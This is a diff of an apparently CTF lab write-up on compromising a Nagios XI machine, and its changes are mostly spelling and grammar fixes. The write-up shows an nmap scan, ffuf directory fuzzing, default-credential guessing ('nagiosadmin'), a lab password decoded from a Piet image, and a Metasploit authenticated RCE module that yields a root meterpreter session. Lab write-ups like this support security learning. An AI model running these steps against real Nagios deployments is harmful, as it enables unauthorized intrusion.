@@ -4,7 +4,7 @@ Identify the critical security flaw in the most powerful and trusted network mon
 ---
 ### Resolution
 
-Nmap verison and default scripts scan:
+Nmap version and default scripts scan:
 ```
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
@@ -35,13 +35,13 @@ Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kern
 
 ```
 
-Both web apps have the same content. Visiting the website we find a suspecious welcoming expression:
+Both web apps (on port 80 and 443) have the same content. Visiting the website we find a suspicious welcoming expression:
 ```
 <...snip...>
                   Welcome to elements.
-					Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
+	Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
 ```
-The symbols refer to periodic elements, based on the atomic number we end up with the following list `[47, 80, 73, 51, 84, 46, 80, 78, 103]`. If we interpret the numbers as ascii characters we get `/PI3T.PNg`. Is this the hidden file? yep it is.
+The symbols refer to periodic elements, and based on the atomic number we end up with the following list `[47, 80, 73, 51, 84, 46, 80, 78, 103]`. If we interpret the numbers as ASCII characters we get `/PI3T.PNg`. Is this the hidden file? yep, it is.
 
 We download that image to inspect it more. We can use `exiftool` to read the image's metadata:
 ```
@@ -56,30 +56,30 @@ Image Size                      : 990x990
 Megapixels                      : 0.980
 ```
 
-There we have our author name as the artist.
+There we have our author's name as the artist.
 
 For the next step, a username is required. A username of what service? we can fuzz the web application for more directories. Spoil alert: the room is about Nagios so we expect it to be in the results.
 ```
-$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<machine_ip>/FUZZ"               
+$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<target_ip>/FUZZ"               
 
 <...snip...>
 javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 41ms]
 nagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 44ms]
 ```
 
-Alternativly, the source code of the home page indicates a path `/nagiosxi/`
+Alternatively, the source code of the home page indicates a path `/nagiosxi/`.
 ![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/57bcd0ba-e59a-403b-b095-71d762a053a8)
 
-Navigating to `http://<machin_ip>/nagiosxi/`, we find a login page for the Nagios XI dashboard.\
-The intuition based on the previous questions is to derive a username from the artist name "Pieter Cornelis Mondriaan". However this was a trap and has nothing to do with the next quesitons.\
-If we take a look at what default usernames Nagios uses for its products, we find a list of potential answers, including the one we're looking for; the default Nagios admin username `nagiosadmin`.
+Navigating to `http://<target_ip>/nagiosxi/`, we find a login page for the Nagios XI dashboard.\
+The intuition based on the previous questions is to derive a username from the artist name "Pieter Cornelis Mondriaan". However, this was a trap and has nothing to do with the next question.\
+If we take a look at what default usernames Nagios uses for its products, we find a list of potential answers, including the one we're looking for; the default Nagios XI admin username `nagiosadmin`.
 
-Back to our picture. I found, after a considerable amount of time, that piet is actually a programming language. From [here](https://esolangs.org/wiki/Piet), we read:
+Back to our picture. I found, after a considerable amount of time, that piet is a programming language. From [here](https://esolangs.org/wiki/Piet), we read:
 > Piet is a stack-based esoteric programming language in which programs look like abstract paintings. It uses 20 colors, of which 18 are related cyclically through a lightness cycle and a hue cycle. A single stack is used for data storage, together with some unusual operations.
 
-We can execute the picture `PI3T.PNg` using an online tool like [npiet online](https://www.bertnase.de/npiet/npiet-execute.php), and then finding the password: `n3p3UQ&9BjLp4$7uhWdY`.
+We can execute the picture `PI3T.PNg` using an online tool like [npiet online](https://www.bertnase.de/npiet/npiet-execute.php), and then find the password: `n3p3UQ&9BjLp4$7uhWdY`.
 
-Now lets launch metasploit and search for a useful exploit.
+Now let's launch Metasploit and search for a useful exploit.
 ```
 msf6 > search nagios xi type:exploit
 
@@ -139,14 +139,7 @@ msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run
 meterpreter > 
 ```
 
-Got a session! Note that the session user is root.\
+Got a session! Note that the session's user is root.\
 The user flag is located at `/home/galand/user.txt` and the root flag is at `/root/root.txt`.
-
-
-
-
-
-
-
 
 
